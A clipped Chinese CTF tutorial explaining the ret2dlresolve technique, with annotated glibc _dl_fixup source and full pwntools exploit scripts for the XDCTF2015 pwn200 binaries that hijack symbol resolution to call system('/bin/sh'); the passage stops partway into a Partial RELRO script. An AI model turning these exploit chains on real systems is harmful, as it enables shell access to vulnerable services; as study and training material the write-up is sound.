---
title: 【先知】Linux 栈溢出利用 ret2dlresolve 技术原理与多场景实战
source: https://xz.aliyun.com/news/92670
source_host: xz.aliyun.com
clip_date: 2026-08-11T15:29:46+08:00
trace_id: 9e578ef6-b61f-4b0e-b053-1ef5cd081cd6
content_hash: 2e68f692a4ca41137f415dd515eab8d84bcac822047bc061902f449b2bdf054d
status: synced
tags:
  - 先知
  - Linux安全
  - CTF
series: null
feed_source: 先知安全技术社区
ai_summary: 无法泄露 libc 基址时，通过伪造延迟绑定所需的字符串表、符号表、重定位表项或 link_map，强制动态链接器解析 system 等目标函数，从而完成栈溢出利用。
ai_summary_style: key-points
images_status:
  total: 8
  succeeded: 8
  failed_urls: []
notion_page_id: 3b975244-d011-810a-bb90-d74ebb9cb4b0
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 无法泄露 libc 基址时，通过伪造延迟绑定所需的字符串表、符号表、重定位表项或 link_map，强制动态链接器解析 system 等目标函数，从而完成栈溢出利用。
> 
> - **触发原理：** 延迟绑定依赖 `_dl_runtime_resolve/_dl_fixup` 按 `reloc_arg` 索引重定位表、符号表、字符串表；攻击者伪造这些表项或对应指针，让解析器最终按 "system" 名字查符号并跳转执行。
> - **绕过检查点：** 必须满足 `r_info` 低位为 7、`sym->st_other` 可见性为零等条件；32 位可通过伪造超大 `reloc_arg` 越界到 .bss，64 位通常会因 `DT_VERSYM` 版本校验越界崩溃，需要进一步伪造 link_map。
> - **场景差异：** No RELRO 下 `.dynamic` 可写，可直接改写 `DT_STRTAB` 指向伪造字符串表；Partial RELRO 下只能伪造重定位结构体，用栈迁移到 .bss 存放并精确计算偏移。
> - **64 位要点：** 64 位 `Elf64_Rela` 为 24 字节，`reloc_arg` 需除以 24；防止版本校验崩溃可让伪造的 `link_map` 中 `DT_VERSYM` 为 NULL，同时用 `r_info=0x100000007` 与 `DT_SYMTAB = fake_sym_addr - 24` 完成“索引对消”。
> - **实用建议：** 常用 pwntools 的 `Ret2dlresolvePayload` 自动构造表项；`data_addr` 必须选可写、空间充足且 8/16 字节对齐的地址，payload 体积：32 位约百字节，64 位带 link_map 需 300–500 字节。

## ret2dlresolve

> 当我们无法通过正常的泄露libc基地址来成功执行系统调用时（也就是无法使用ret2libc方法），这时候就需要采用ret2dlresolve技术了

\[我的博客园\]([Vortex31 - 博客园](https://www.cnblogs.com/Vortex31))

## 前置知识

### 延迟绑定

> 动态链接将链接工作由编译时推迟到了运行时，在每次程序运行时，动态链接器都要寻找并加载依赖的动态库，然后进行符号查找和重定位工作，这导致动态链接的程序在加载时会带来一些额外的开销，为了提升程序的加载速度，编译系统使用了一种称为延迟绑定的技术

在动态链接下，程序加载的模块中包含了大量的函数调用，因此动态链接器会耗费很多时间用于解决模块间的函数引用的符号查找和重定位，而实际上只有很少的一部分符号会被立即访问，延迟绑定通过将函数地址的绑定推迟到第一次调用这个函数时，从而避免动态链接器在加载时处理大量函数引用的重定位，让使用到的函数才存放地址。

使用到两个特殊的数据结构：全局偏移表GOT（数据段），过程链接表PLT（代码段）

#### GOT（全局偏移表）

全局偏移表在ELF文件中以独立的节区存在，共包含两类，对应节区名为.got和.got.plt，其中，.got存放所有对于外部变量引用的地址，.got.plt保存所有对于外部函数引用的地址，对于延迟绑定主要使用.got.plt表，结构如下：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/4cc9c347b9ef0cb3.png)

可以看到.got.plt表的前三项存放着特殊的地址引用：

GOT\[0\]：保存.dynamic段的地址，动态链接器利用该地址提取动态链接相关的信息

GOT\[1\]：保存本模块的ID

GOT\[2\]：存放了指向动态链接器\_dl_runtime_resolve函数的地址，

#### 过程链接器

为了实现延迟绑定，当调用外部模块的函数时，程序并不会直接通过GOT跳转，而是通过存储在PLT表中的特定表项进行跳转，对于所有的外部函数，在PLT表都会有一个相应的项，其中每个表都保存了16字节的代码，用于调用一个具体的函数，相应结构如下：

```latex
puts@plt:
    jmp     QWORD PTR [got_puts]   ; 【第一个 jmp】跳到 GOT 表里存的地址
    push    0x1                    ; 【这就是所谓的“压 ID”】
    jmp     PLT0                   ; 【第二个 jmp】跳到 PLT 表的头部 (PLT0)
```

```python
PLT0
1. push [GOT[1]] （把 link_map 指针压栈作为参数）。
2. jmp [GOT[2]] （跳去执行 _dl_runtime_resolve）。
```

### 过程

#### \_dl_runtime_resolve

函数\_dl_runtime_resolve(link_map，reloc_offset)可以对动态链接的函数进行重定位

第一次调用这个函数，先是到plt表，然后jmp到got表

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/bd2d23d777239a69.png)

此时got表存的地址是在plt表上

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fb71cd0aec8d25d1.png)

其实也就是jmp got的下一条指令，先是push ID（即为函数在rel.plt上的偏移，reloc_arg），然后jmp到plt\[0\]

到了plt\[0\]之后，按照顺序先push got\[1\]，got\[1\]就是link_map（链接器的标识信息），然后jmp到got\[2\]也就是\_dl_runtime_resolve函数的地址

```python
PLT0:
    push    DWORD PTR [GOT+4]   ; 将 GOT[1] 的内容压入栈中
    jmp     DWORD PTR [GOT+8]   ; 跳转到 GOT[2] 存放的地址去执行
```

这里就是全流程。。。

就比如说对于puts函数去讲解吧

1.第一次调用puts时，got_puts里面存的其实是下一条指令的地址（即push 0x1）的地址，所以第一个jmp以后，没有去别的地方，而是顺着往下执行

2.执行push 0x1，这里的0x1其实就是ID（重定位索引表），它告诉动态链接器需要解析的函数在重定位表中的索引

3.执行jmp PLT0，跳到PLT表的开头，PLT0里面有一段固定的代码，会去调用\_dl_runtime_resolve（动态解析函数）

4.解析过程：\_dl_runtime_resolve拿到了刚才压入的ID，去符号表（SYMTAB）和字符串表（STRTAB）里查找到这个函数名叫"puts"，然后去libc里找到puts函数的真实内存地址，填回到got_puts中，最后执行puts

5.第二次调用puts时，第一个jmp执行时，因为got_puts里已经有真实的libc地址了，就直接执行，不会再执行后面的push和jmp

```python
你调用的函数 (如 read@plt)
   │
   ├─> 1. push ID (reloc_arg)
   ├─> 2. jmp PLT[0]
   │
PLT[0]
   │
   ├─> 3. push link_map (GOT[1])
   ├─> 4. jmp _dl_runtime_resolve (GOT[2])
   │
_dl_runtime_resolve (汇编层 Wrapper)
   │
   ├─> 5. push 保存各个寄存器
   ├─> 6. call _dl_fixup(link_map, ID)  <--- 【核心查字典逻辑，也就是我们做伪造的地方】
   │      (查出真实地址，更新GOT表，返回地址)
   ├─> 7. pop 恢复各个寄存器，清理栈上的 link_map 和 ID
   ├─> 8. jmp 真实函数地址 (如 system)
   │
真实函数 (如 system)
   │
   └─> 9. 接收一开始布置在栈上的参数 (如 /bin/sh)，开始执行！
```

#### \_dl_fixup

> 前面说的是延迟绑定，接下来\_dl_fixup就是Linux动态链接器实现"延迟绑定"的真正执行者，它的任务是：根据传入的ID，查符号表和字符串表，找到函数的真实内存地址，把地址填回GOT表，然后把真实地址给CPU去执行

##### 代码

```python
/*
 * 核心函数：_dl_fixup
 * 作用：执行“延迟绑定(Lazy Binding)”，负责在程序第一次调用外部函数时，
 *       查表找到该函数的真实内存地址，并填入 GOT 表中。
 * 参数：
 *   l: 指向当前程序/共享库的 link_map 结构体指针（包含了加载基址、动态节信息等）。
 *   reloc_arg: 就是在 PLT 表中 "push ID" 压入的那个重定位偏移量/索引（可控！）。
 */
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
       ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
       struct link_map *l, ElfW(Word) reloc_arg)
{
  /* 
   * [系统机制] 第一步：从程序的 .dynamic 节区提取三大核心表的基地址
   * [利用] 如果程序没有开启 RELRO，.dynamic节区是可写的。
   * 可以通过修改 l_info[DT_STRTAB] 等指针，让它们指向伪造的地址！
   */
  // 获取符号表 (SYMTAB) 的基地址
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
    
  // 获取字符串表 (STRTAB) 的基地址
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  // 获取重定位表 (JMPREL) 的基地址，并加上我们传入的 ID (reloc_arg)，
  // 精确锁定我们要解析的那个函数的重定位表项 (reloc)。
  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
    
  /* 
   * [系统机制] 第二步：定位符号结构体
   * 通过 reloc->r_info 提取出该函数在符号表(symtab)中的索引，
   * 从而拿到对应的符号结构体 sym。
   */
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  
  // 计算出该函数的 GOT 表地址 (将来要把真实地址写回这里)
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  /* 安全检查：确保我们要解析的确实是一个 PLT 类型的重定位（即函数调用） */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

  /* 检查符号的可见性，绝大部分普通的外部函数（如 read, puts）都会进入 if 块 */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      // ... (省略部分版本校验(Version)代码，处理符号版本冲突用) ...

      // 线程安全与锁相关（避免多线程同时解析导致竞争）
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
    {
      THREAD_GSCOPE_SET_FLAG ();
      flags |= DL_LOOKUP_GSCOPE_LOCK;
    }

      /* 
       * [系统机制] 第三步：根据字符串名字，去系统共享库中查找真实的物理地址！
       * 这是最最核心的一句：_dl_lookup_symbol_x
       * [利用] 看第一个参数：strtab + sym->st_name
       *   - strtab 是字符串表的基址。
       *   - sym->st_name 是字符串偏移。
       * 如果改了 strtab 的指针，或者在那个偏移处填了 "system\x00"，
       * 链接器就会拿着 "system" 这个字符串去 libc 里找，最终找出的也是 system 的真实地址！
       */
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

      // 解锁全局作用域
      if (!RTLD_SINGLE_THREAD_P)
    THREAD_GSCOPE_RESET_FLAG ();

      /* 
       * [系统机制] 第四步：计算绝对地址
       * result 包含了库的加载基地址(Base Address)，
       * 加上符号本身的偏移量(st_value)，得出它在当前进程内存中的绝对物理地址！
       */
      value = DL_FIXUP_MAKE_VALUE (result,
                   sym ? (LOOKUP_VALUE_ADDRESS (result)
                      + sym->st_value) : 0);
    }
  else
    {
      /* 特殊情况：如果符号已经找到了（比如自身内部的符号），直接算地址 */
      value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
      result = l;
    }

  /* 处理特殊的加数机制 (Addend)，通常用于其他架构，x86/x64 一般不影响 */
  value = elf_machine_plt_value (l, reloc, value);

  /* 处理 GNU_IFUNC 类型的符号（一种允许在运行时根据 CPU 特性选择不同优化的机制） */
  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));

  /* 如果环境变量强制要求不绑定 (LD_BIND_NOT=1)，直接返回地址，不写 GOT 表 */
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;

  /* 
   * [系统机制] 第五步：修补 GOT 表
   * 调用 elf_machine_fixup_plt，将上面算出的绝对内存地址 (value) 
   * 写入到该函数对应的 GOT 表项中 (rel_addr)。
   * 下次再调用这个函数时，第一条 jmp [got] 就会直接跳到真实地址，不再走解析流程。
   */
  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
}
```

通过阅读\_dl_fixup源码可以总结出一般的函数重定向流程：

1.通过struct link_map \*l获得.dynsym，.dynstr，.rel.plt地址

2.通过reloc_arg+.rel.plt地址获得函数对应的Elf32_Rel指针，记作reloc

3.通过reloc->r_info和.dynsym地址取得函数对应的Elf32_Sym指针，记作sym

4.检查r_info最低位是否为7

5.检查(sym->st_other)&0x03是否为0

6.通过strtab+sym->st_name获得函数对应的字符串，进行查找，找到后赋值给rel_addr，更新GOT表，最后调用这个函数（jmp eax）

> 对于reloc_arg，如果想把reloc指针骗到我们伪造的地址，如bss段的fake_reloc_addr
> 
> 32位下 **reloc_arg = fake_reloc_addr - DT_JMPREL真实地址**
> 
> 64位下reloc_arg = (fake_reloc_addr - DT_JMPREL真实地址) / 24
> 
> 发现64位下的reloc_arg还得被24整除，而且reloc_arg还得去检查各种版本号，一旦过大就会崩溃，所以一般情况都直接把reloc_arg设为0，这样把DT_JMPREL的地址指向我们伪造的结构体

## 攻击原理

在Linux中，程序使用\_dl_runtime_resolve(link_map，reloc_offset)来对动态链接的函数进行重定位，对于动态链接在解析符号地址时所使用的重定位表项，动态符号表，动态字符串都是从目标文件的动态节.dynamic索引所得到的，所以如果可以修改其中的某些内容使得最后的动态链接器解析的符号是我们想要的解析的符号，那么攻击就达成了

### 思路一

**直接控制重定位表项的相关内容**

由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的，因此，一个很自然的想法是直接修改动态字符串表.dynamic，比如把某个函数在字符串表对应的字符串修改为目标函数的，就可以实现利用效果

### 思路二

**间接控制重定位表项的相关内容**

既然动态链接器会从 `.dynamic` 节中索引到各个目标节，那如果我们可以修改动态节中的内容，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的。

### 思路三

**伪造 link_map**

由于动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。

### 归纳

#### 第一种攻击手法

**伪造函数名称对应字符串的地址**

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/4edeb72e99f6bf6e.png)

获取函数名称对应的字符串：strtab+sym->st_name

这里产生了两个攻击对象，一个是strtab，另一个是sym->st_name

我们可以先将程序bss段写入"system"，再修改strtab或者sym->st_name，使strtab+sym->st_name指向"system"所在的地址，不过修改需要注意DT_STRTAB、sym->st_name所在地址有可写权限，可以通过GDB的vmmap来查看是否具有权限

这个攻击手法32位，64位都可以使用

#### 第二种攻击手法

**32位下的伪造reloc_arg，伪造结构体**

宏观地从函数重定向流程来看，程序根据reloc_arg和各个section的地址来取得偏移量，最终定位到函数名称所对应的字符串地址

既然reloc_arg是存放在栈中的，我们可以伪造reloc_arg和Elf32_Sym等结构体，通过虚假的reloc_arg引导程序指向我们伪造的结构体，进而取得我们伪造的偏移量，最终取得伪造的函数字符串，除此之外，在伪造结构体的过程中，我们还要注意程序对reloc->r_info的最低位，sym->st_other的检测全过程：

1.  **取重定位表项：**  
    链接器取出你给的超大 reloc_arg。  
    执行：JMPREL + reloc_arg。  
    **结果：** 指针直接飞出真实表区，准确落在了你在.bss 伪造的 Elf32_Rel 上。
2.  **过类型检查，取符号表索引：**  
    链接器查看假 Elf32_Rel 的 r_info。发现最低位是 7，断言通过！然后提取高 24 位，拿到了你精心计算的 sym_index。
3.  **取符号表项：**  
    链接器执行：SYMTAB + sym_index \* 16。  
    **结果：** 指针再次飞跃，准确落在了你伪造的 Elf32_Sym 上。
4.  **过可见性检查，取字符串偏移：**  
    链接器查看假 Elf32_Sym 的 st_other，发现是 0，检查通过！接着取出里面的 st_name 偏移。
5.  **取函数名字符串：**  
    链接器执行：STRTAB + st_name。  
    **结果：** 指针第三次飞跃，落在了你写下的 "system " 字符串上。
6.  **终局：**  
    链接器拿着 "system" 这个名字去 libc 里面搜索，找到了真实的 system 函数地址。将其写回 r_offset 指定的位置，并直接跳过去执行。
7.  **执行命令：**  
    system 启动，顺手从栈上捞起了你一开始布置的 "/bin/sh"，成功弹出 Shell。

**这个攻击手法有一定的限制，32位能够随便用，64位有大概率导致失败** （版本检测问题）

#### 第三种攻击手法

**64位下的修改reloc_arg，伪造结构体**

```python
if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)  
{
    const ElfW(Half) *vernum =(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
    version = &l->l_versions[ndx];
    if (version->hash == 0)
      version = NULL;
}
```

之前由于这个if语句，64位下无法像32位下那样修改reloc_arg，伪造结构体，所以我们需要先泄露link_map地址，再将link_map+0x1c8设置成不为0  
之后就是和32位下的思路一样了，根据64位下的结构体伪造结构体，伪造reloc_arg来进行攻击。

#### 第四种攻击手法

**伪造link_map（需要知道libc版本）**

```python
if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0) //判断(sym->st_other)&0x03是否为0
{           
            ······                              
    if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)  
    {
            ······
    }
}
else
{
  value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
  result = l;
}
```

在第三种攻击手法中也说了，当(sym->st_other)&0x03 == 0时，我们还需要将link_map+0x1c8设置为非0。  
在这里来看看我们之前忽略掉了else语句，DL_FIXUP_MAKE_VALUE用来计算出函数的真实地址，我们只要将(sym->st_other)&0x03设置为非0，进入else语句，l->l_addr + sym->st_value指向system语句即可进入system函数。

那么问题就来了，我们并不知道system函数的真实地址。我们可以这样做，让sym->st_value落在某个已经解析了的函数got表上，l->l_addr设置为system函数和这个已经解析的函数的偏移值。另外，sym->st_value落在某个已经解析了的函数got表上，说明这个函数对应的sym = 这个got表地址-8，通常而言sym对应着另外一个函数的got表地址，这种情况你需要确保另外一个函数也是已经解析过的,此时sym->st_other一般为0x7f,才能保证(sym->st_other)&0x03!= 0。如果sym不是对应着另一个函数的got表，需要确保(\*(sym+5))&0x03!= 0。

我们需要将l->l_addr设置成我们想要的值，又不用泄露link_map地址，这就要求我们来伪造link_map结构体。我们还需要控制symtab和reloc->r_info,因此我们还要伪造位于link_map+0x70的DT_SYMTAB指针、link_map+0xf8的DT_JMPREL指针，另外strtab必须是个可读的地址，因此我们还需要伪造位于link_map+0x68的DT_STRTAB指针。之后就是伪造.dynamic中的DT_SYMTAB结构体和DT_JMPREL结构体以及函数所对应的Elf64_Rela结构体。为了方便，我在构造的过程中一般将reloc_arg作为0来进行构造。

**总的来说要满足以下几个条件：**

1.  link_map中的DT_STRTAB、DT_SYMTAB、DT_JMPREL可读
2.  DT_SYMTAB结构体中的d_ptr即sym，(\*(sym+5))&0x03!= 0
3.  (reloc->r_info)&0xff == 7
4.  rel_addr = l->addr + reloc->r_offset即原先需要修改的got表地址有可写权限
5.  l->l_addr + sym->st_value 为system的地址

## 经典题目分析

对于三种RELRO模式，可以看看对应特点

|     |     |     |     |
| --- | --- | --- | --- |   
| RELRO 类型 | `.got.plt` 可写性 | 攻击难度 | 是否启用 lazy binding（延迟绑定） |
| **No RELRO** | 可写  | 最低  | 开启  |
| **Partial RELRO** | `.got.plt` 可写 | 中等  | 开启  |
| **Full RELRO** | `.got.plt` 也只读 | 最高  | 禁用（立即绑定） |

### No RELRO

#### 32位

CTF-Wiki main_no_relro_32

```plain
❯ gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32
❯ checksec main_no_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

在No RELRO的情况下，我们可以直接修改.dynamic节，只需要修改.dynamic节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串就行了

1.修改.dynamic节中字符串表的地址为伪造的地址

2.在伪造的地址处构造好字符串表，将read字符串替换为system字符串

3.在特定位置读取/bin/sh字符串

4.调用read函数的PLT第二条指令，触发\_dl_runtime_resolve进行函数解析，从而执行system函数

##### 脚本

```python
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]的终端，这里用 tmux 切分窗口
context.arch = "i386"               

#初始化
p = process("./no_relro_32")   
rop = ROP("./no_relro_32")    
elf = ELF("./no_relro_32")     （Section）数据和地址

p.recvuntil(b'Welcome to XDCTF2015~!\n')

#构造 ROP 链 
offset = 112                         # 栈溢出的偏移量，距离返回地址需要填充 112 字节
rop.raw(offset * 'a')                # 填充 112 个 'a'，覆盖局部变量和 saved ebp

# --- 第一步：篡改 .dynamic 节中的字符串表指针 ---
# No RELRO 的情况下，.dynamic 节是可写的。
# 0x08049804 是 DT_STRTAB 结构体的地址，其前4字节是 tag，后4字节是指针。
# 所以 0x08049804 + 4 就是实际指向 .dynstr（动态字符串表）的地址指针。
# 这里调用 read(fd=0, buf=0x08049804+4, size=4)，准备把这个指针改成我们伪造的地址。
rop.read(0, 0x08049804 + 4, 4) 
 
# --- 第二步：在内存中伪造一个新的字符串表 (.dynstr) ---
# 获取原程序中真实的 .dynstr 节的数据
dynstr = elf.get_section_by_name('.dynstr').data()
# 【核心漏洞利用】将原本的 "read" 字符串替换成 "system"
dynstr = dynstr.replace(b"read", b"system")

# 调用 read(fd=0, buf=0x080498E0, size=len(dynstr))
# 0x080498E0 是我们在 .bss 段或其他可写段中挑选的一个空白地址。
# 我们把刚才篡改好的伪造字符串表写进这个空白地址中。
rop.read(0, 0x080498E0, len(dynstr)) 

# --- 第三步：把命令字符串 "/bin/sh\x00" 写入内存 ---
# 调用 read(fd=0, buf=0x080498E0+0x100, size=8)
# 在刚才伪造的表后面一点的位置（+0x100），找个空地写入将来给 system 用的参数
rop.read(0, 0x080498E0 + 0x100, len(b"/bin/sh\x00")) 

# --- 第四步：强制触发动态链接器解析函数 ---
# 0x08048376 是 read@plt 的第二条指令地址 (即 push reloc_offset; jmp .plt_got)。
# 直接跳到这里，会跳过第一条 jmp *got 指令，强制进入 _dl_runtime_resolve 进行函数解析。
rop.raw(0x08048376) 
# 因为之前已经把字符串表指针改向了伪造表，解析器在找 "read" 时，实际拿到的是 "system" 字符串。
# 所以这里解析出来并在底层执行的实际上是 system 函数！

# 设置 system 函数的返回地址（随便给个无效地址 0xdeadbeef 即可，因为我们拿到 shell 就不管了）
rop.raw(0xdeadbeef) 
# 设置 system 函数的参数指针，刚好指向我们刚才写入 "/bin/sh\x00" 的地址
rop.raw(0x080498E0 + 0x100) 

# print(rop.dump()) # 调试用，打印 ROP 链的当前状态

# 发送 Payload  
# 根据程序的漏洞限制（可能是 read 函数限制了最多读取 256 字节），检查 ROP 链是否超长
assert(len(rop.chain()) <= 256)
# 用 'a' 把剩余的空间补齐到 256 字节，凑满漏洞程序的 read 长度要求
rop.raw("a" * (256 - len(rop.chain())))
 
# 1. 触发栈溢出，将设定好的所有 ROP 链打入程序
p.send(rop.chain())

# 此时程序会依次执行我们刚刚用 ROP 布置的 3 个 read 函数：
# 2. 响应第一次 read：发送我们伪造的字符串表首地址，覆盖 .dynamic 中的旧指针
p.send(p32(0x080498E0))

# 3. 响应第二次 read：发送带有 "system" 的伪造字符串表数据，填入 0x080498E0
p.send(dynstr)

# 4. 响应第三次 read：发送系统命令 "/bin/sh\x00"，填入 0x080498E0+0x100
p.send(b"/bin/sh\x00")

# 全部发送完毕后，最后 ROP 链执行到 read@plt 第二条指令，触发解析并执行 system("/bin/sh")
# 获取 Shell 
p.interactive()
```

* * *

#### 64位

参考以及题目来自：  
[深入理解ret2dlresolve | Collectcrop's Blog](https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/#no-relro-64)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/c3dfcfb73923ed6c.png)

这题很明显，是一道栈溢出

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/7d338aacc37af5dd.png)

得使用ret2csu，把这些gadget利用一下

由于寻找libc基址是通过 **strtab + sym->st_name** 这个函数的名字来查找的

类似32位的方法一样构造，这题多加一个ret2csu

在.dynamic节中存着DT_STRTAB和DT_SYMTAB，分别指向字符串表和符号表，而.dynamic节在No RELRO的情况下是可写的，那么利用思路就很明显了，可以直接ROP链调用read读取内容覆盖DT_STRTAB为一个我们可控的地址，然后我们自己在该地址处伪造一个字符表，把目标字符串换成system， **最后直接返回到函数PLT表第二个jmp前的push处压ID调用\_dl_runtime_resolve**

对于最后那步，是攻击利用最重要的一步，因为之前已经通过漏洞把DT_STRTAB（字符串表）改了，把原本对应puts或者read的字符串，在内存里直接换成system，现在需要直接执行system函数，但因为puts函数之前已经被调用过，第一个jmp会直接跳到真实的puts去执行，动态链接根本就不启动，所以说，在写ROP链的时候，不跳到puts@plt的第一行，而是精准地跳到第二行，也就是push ID那个内存地址，这样就就可以跳过第一个jmp的检查，让程序以为现在是第一次解析这个函数，于是去调用\_dl_runtime_resolve函数，接着去拿ID查字符串。最终找到的是伪造的函数即为system函数，然后调用系统函数，getshell

##### 脚本

```python
from pwn import *
context(arch="amd64",log_level="debug")
context.terminal=["cmd.exe","/c", "start", "cmd.exe", "/c", "wsl.exe", "-e"]
p = process("main_no_relro_64")
elf = ELF("./main_no_relro_64")

pop_rdi_ret = 0x0000000000400773
pop_rsi_r15_ret = 0x0000000000400771
ret = 0x00000000004004c6
read_got = 0x600B18
gadget1 = 0x40076A
gadget2 = 0x400750
strtab = 0x600990
main = 0x40063E
data = 0x600c00

def ret2csu(call_got_addr, rdi_val, rsi_val, rdx_val, padding=0x78, return_after_call=0x0):
    payload = b"A" * padding
    payload += p64(gadget1)       # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
    payload += p64(0)             # rbx
    payload += p64(1)             # rbp
    payload += p64(call_got_addr) # r12 = GOT 地址
    payload += p64(rdi_val)       # r13 = edi
    payload += p64(rsi_val)       # r14 = rsi
    payload += p64(rdx_val)       # r15 = rdx
    payload += p64(gadget2)       # mov rdx, r15; mov rsi, r14; mov edi, r13; call [r12+rbx*8]
    payload += p64(0) * 7         # 对齐，模拟返回值保存现场
    payload += p64(return_after_call) if return_after_call else b""
    return payload

p.sendlineafter("Welcome to XDCTF2015~!",ret2csu(read_got, 0, strtab, 8, return_after_call=main))
p.send(p64(data))		# 更改DT_STRTAB

dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b"read",b"system")

p.sendlineafter("Welcome to XDCTF2015~!",ret2csu(read_got, 0, data, 0x60, return_after_call=main))
p.send(dynstr)		# 伪造字符表

p.sendlineafter("Welcome to XDCTF2015~!",ret2csu(read_got, 0, data+0x100, 8, return_after_call=main))
p.send(b"/bin/sh\x00")			# 读入字符串

payload = b"a"*0x78 + p64(ret) + p64(pop_rdi_ret) + p64(data+0x100) + p64(0x400516)
p.sendlineafter("Welcome to XDCTF2015~!",payload)		# 将read函数解析成system从而获取shell

p.interactive()
```

* * *

### PARTIAL RELRO

> 当程序开启了PARTIAL RELRO，即.dynamic节区（以及.got等部分节区）变成只读，无法像之前一样直接调用read去修改DT_STRTAB这个指针，一旦写入就会触发段错误

#### 32位

既然无法直接修改，那我们就换一种思路，伪造"查表的索引（ID）"，让它越界读到我们提前构造好的bss段上

##### 思路

大偏移

回顾\_dl_fixup函数查表的底层逻辑，它是靠ID去一步步找数据的：

1.  reloc = JMPREL + reloc_arg (重定位表项)
2.  sym = SYMTAB + sym_index \* size (符号表项)
3.  string = STRTAB + sym->st_name (字符串名字)

很自然想到，既然JMPREL，SYMTAB，STRTAB的基地址我们改变不了，那我们何不把reloc_arg（偏移量）填成一个超级大的值，然后让JMPREL+reloc_arg的地址直接跑出只读区域，落入可读可写的.bss段

##### 具体操作

1.伪造字符串

在bss段找个地方写好"system "，然后计算st_name = (伪造字符串的地址 - STRTAB 基址)。

2.伪造符号表项（ELF_Sym)

在.bss找个地方，伪造一个16字节（32位）或24字节（64位）的ELF_Sym结构体，把结构体里的st_name字段，填上我们第一步算出来的偏移量，然后计算sym_index = (伪造的 Elf_Sym 地址 - SYMTAB 基址) / 结构体大小。

3.伪造重定位项

接着在bss段里伪造一个重定位结构体，把它里面的r_info字段，通过位运算塞入我们在第二步算出的sym_index，然后计算 **reloc_arg = (伪造的 Elf_Rel 地址 - JMPREL 基址)** （在 64 位下还要除以结构体大小）。

4.触发漏洞

使用ROP将参数设置好，然后跳转到PLT0，并将第三步算出来的reloc_arg给push进去，动态链接拿着这个ID走流程，完美地被引导到了我们在.bss里面伪造的结构体里，最终找出system

##### 例题分析

CTF-Wiki main_partial_relro_32

```latex
❯ checksec main_partial_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/parti
al-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看到NX enabled，也就是堆栈不可执行，而且Partial RELRO，也就是部分可读，这种情况下，ELF文件中的.dynamic节将变为只读，这时我们可以通过伪造重定位表项的方式来调用目标函数。

###### 手工伪造

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/4418ca61462c0ddf.png)

已经知道栈溢出漏洞，并拿到偏移为112，接下去分阶段一步步构造payload

###### Stage1

**劫持控制流，栈迁移**

由于原栈空间有限，无法容纳后续伪造的庞大结构体，需要将栈指针（esp）迁移到具有读写权限且空间广阔的.bss段，利用栈溢出，先调用read(0,bss_addr,size)将后续的ROP链写入.bss段，随后利用leave；ret将esp劫持到该bss段

```python
from pwn import *
elf = ELF('./partial_relro_32')
r = process('./partial_relro_32')
rop = ROP('./partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil(b'Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
